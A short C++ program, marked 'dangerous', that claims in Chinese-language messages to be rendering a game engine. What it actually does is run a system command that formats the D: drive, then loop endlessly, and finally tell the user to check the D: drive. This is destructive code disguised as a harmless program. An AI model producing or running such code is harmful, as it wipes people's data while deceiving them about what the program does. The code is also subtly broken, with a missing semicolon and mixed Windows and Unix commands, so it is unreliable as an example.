//! dangerous
#include<iostream>
#include<cstdlib>
using namespace std;
int main(){
  cerr<<"开始渲染游戏引擎……";
  system("format /P:16 /X D: > tmpfile");
  while(true){
    system("find \"%\" tmpfile");
    system("timeout /t 1 /nobreak");
    system("clear")
  }
  cerr<<"游戏渲染成功。请检查D盘。";
}
